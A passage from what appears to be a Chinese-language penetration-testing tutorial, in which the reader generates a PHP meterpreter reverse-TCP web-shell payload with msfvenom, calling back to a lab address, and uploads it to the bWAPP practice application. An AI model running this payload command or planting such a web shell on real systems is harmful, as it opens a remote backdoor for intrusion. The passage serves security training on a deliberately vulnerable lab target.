  \ `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.29.148 lport=4444 R > webshell.php`\
  \ 来生成基于 PHP 的 Web Shell 后门负载。在此步中，指定如图 6.40](#ch06.xhtml_fig6-40) 所示的回连 IP、端口和负载类型：\n\
  \n    ![](img/Figure_6.40.png)\n    图 6.40：生成基于 PHP 的 Web Shell 后门负载\n\n3. 返回 `bWAPP`\
  \ 并按照图 6.41](#ch06.xhtml_fig6-41)所示所示新创建的 `webshell`：\n\n    ![](img/Figure_6.41.png)\n\
